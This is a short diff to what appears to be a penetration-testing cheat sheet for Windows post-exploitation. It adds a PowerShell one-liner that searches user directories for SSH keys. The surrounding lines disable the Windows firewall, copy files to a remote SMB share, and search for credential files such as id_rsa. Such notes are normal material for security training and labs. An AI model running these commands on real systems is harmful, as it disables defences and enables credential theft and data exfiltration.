@@ -75,7 +75,10 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
-### Enumeration
+# Enumeration
+
+Search for SSH keys in Users directory:
+- `Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }`
 
 Search for interesting files:
 - `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`
